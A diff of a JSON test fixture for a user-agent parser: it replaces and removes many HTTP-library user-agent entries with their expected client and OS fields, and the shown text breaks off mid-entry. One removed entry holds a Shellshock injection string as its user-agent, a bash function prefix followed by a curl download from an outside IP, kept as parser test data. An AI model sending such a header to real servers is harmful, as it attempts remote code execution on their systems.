@@ -1,7 +1,7 @@
 [
   {
     "headers": {
-      "user-agent": "HTTPClient/1.0 (2.6.0.1, ruby 2.2.4 (2015-12-16))"
+      "user-agent": "Mandrill-PHP/1.0.55"
     },
     "device": {
       "architecture": "",
@@ -23,9 +23,9 @@
       "bits": 0
     },
     "client": {
-      "name": "ruby",
+      "name": "Mandrill PHP",
       "modus": null,
-      "version": "2.2.4",
+      "version": "1.0.55",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -46,7 +46,7 @@
   },
   {
     "headers": {
-      "user-agent": "LWP::Simple/5.835 libwww-perl/5.836"
+      "user-agent": "electron-fetch/1.0 electron (+https://github.com/arantes555/electron-fetch)"
     },
     "device": {
       "architecture": "",
@@ -68,9 +68,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "Electron Fetch",
       "modus": null,
-      "version": "5.836.0",
+      "version": "1.0.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -91,7 +91,7 @@
   },
   {
     "headers": {
-      "user-agent": "libwww-perl/6.26"
+      "user-agent": "httprs/0.1.0"
     },
     "device": {
       "architecture": "",
@@ -113,9 +113,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "httprs",
       "modus": null,
-      "version": "6.26.0",
+      "version": "0.1.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -136,7 +136,7 @@
   },
   {
     "headers": {
-      "user-agent": "GuzzleHttp/6.2.1 curl/7.26.0 PHP/5.6.30-1~dotdeb+7.1"
+      "user-agent": "ICAP-Client-Library/2.3"
     },
     "device": {
       "architecture": "",
@@ -158,9 +158,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Guzzle Http Client",
+      "name": "ICAP Client",
       "modus": null,
-      "version": "6.2.1",
+      "version": "2.3.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -181,7 +181,7 @@
   },
   {
     "headers": {
-      "user-agent": "curl/7.54.0"
+      "user-agent": "IPinfoClient/PHP/3.1.2"
     },
     "device": {
       "architecture": "",
@@ -203,9 +203,9 @@
       "bits": 0
     },
     "client": {
-      "name": "cURL",
+      "name": "IPinfo",
       "modus": null,
-      "version": "7.54.0",
+      "version": "3.1.2",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -226,7 +226,7 @@
   },
   {
     "headers": {
-      "user-agent": "okhttp/3.3.0"
+      "user-agent": "IPinfoClient/Ruby/2.2.1"
     },
     "device": {
       "architecture": "",
@@ -248,54 +248,9 @@
       "bits": 0
     },
     "client": {
-      "name": "OkHttp",
+      "name": "IPinfo",
       "modus": null,
-      "version": "3.3.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": "Android",
-      "marketingName": "Android",
-      "version": null,
-      "manufacturer": "google",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.43.0 libcurl/7.54.0 OpenSSL/1.0.2l zlib/1.2.11"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.43.0",
+      "version": "2.2.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -316,7 +271,7 @@
   },
   {
     "headers": {
-      "user-agent": "lwp-request/6.03 libwww-perl/6.03"
+      "user-agent": "IPinfoClient/Java/3.0.0"
     },
     "device": {
       "architecture": "",
@@ -338,19 +293,19 @@
       "bits": 0
     },
     "client": {
-      "name": "Perl",
+      "name": "IPinfo",
       "modus": null,
-      "version": "6.03.0",
+      "version": "3.0.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
       "bits": 0
     },
     "os": {
-      "name": null,
-      "marketingName": null,
+      "name": "JavaOS",
+      "marketingName": "JavaOS",
       "version": null,
-      "manufacturer": "unknown",
+      "manufacturer": "sun",
       "bits": 0
     },
     "engine": {
@@ -361,7 +316,7 @@
   },
   {
     "headers": {
-      "user-agent": "GuzzleHttp/6.2.1 curl/7.47.0 PHP/7.0.19-1+deb.sury.org~xenial+2"
+      "user-agent": "quic-go HTTP/3"
     },
     "device": {
       "architecture": "",
@@ -383,187 +338,7 @@
       "bits": 0
     },
     "client": {
-      "name": "Guzzle Http Client",
-      "modus": null,
-      "version": "6.2.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.54.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.54.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Python-httplib2/0.9.1 (gzip)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "httplib2",
-      "modus": null,
-      "version": "0.9.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "libcurl/7.53.1 r-curl/2.6 httr/1.2.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "r-curl",
-      "modus": null,
-      "version": "2.6.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.5.15 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
+      "name": "quic-go",
       "modus": null,
       "version": null,
       "manufacturer": "unknown",
@@ -586,1312 +361,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mechanize/2.7.3 Ruby/2.1.2p95 (http://github.com/sparklemotion/mechanize/)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Mechanize",
-      "modus": null,
-      "version": "2.7.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": "WebKit",
-      "version": null,
-      "manufacturer": "apple"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.19.5 libcurl/7.26.0 GnuTLS/2.12.20 zlib/1.2.8 libidn/1.25 libssh2/1.4.2 librtmp/2.3"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.19.5",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.4.0, ruby 2.1.3 (2014-09-19))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "2.1.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.36.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.36.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "lwp-request/5.834 libwww-perl/5.834"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Perl",
-      "modus": null,
-      "version": "5.834.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.19.3.1 libcurl/7.26.0 GnuTLS/2.12.20 zlib/1.2.7 libidn/1.25 libssh2/1.4.2 librtmp/2.3"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.19.3.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.31.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.31.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.5.0, ruby 1.9.3 (2013-06-27))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "1.9.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "lwp-request/6.03 libwww-perl/6.05"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Perl",
-      "modus": null,
-      "version": "6.05.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.4.33 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.4.0, ruby 2.1.2 (2014-05-08))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "2.1.2",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "() { :; }; curl -O http://93.174.95.73/ODcuMTE4LjY5LjQ3U2hlbGxTaG9ja1NhbHQ= >> /dev/null"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.3.27 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.4.0, ruby 1.9.3 (2013-11-22))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "1.9.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.19.5 libcurl/7.35.0 OpenSSL/1.0.1f zlib/1.2.8 libidn/1.28 librtmp/2.3"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.19.5",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTMLParser/2.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "HTML Parser",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.3.3-7+squeeze19 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Icarus6 - PycURL/7.23.1 (contact: phil@icarus6.com)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.23.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "libwww-perl/6.06"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Perl",
-      "modus": null,
-      "version": "6.06.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Python/3.4 aiohttp/0.9.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "aiohttp",
-      "modus": null,
-      "version": "0.9.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Python/3.3 aiohttp/0.9.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "aiohttp",
-      "modus": null,
-      "version": "0.9.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.3.4.1, ruby 1.9.3 (2013-11-22))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "1.9.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.3.4.1, ruby 1.9.3 (2014-05-14))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "1.9.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "libwww-perl/5.813"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Perl",
-      "modus": null,
-      "version": "5.813.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.3.3 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Python/3.4 aiohttp/0.7.2"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
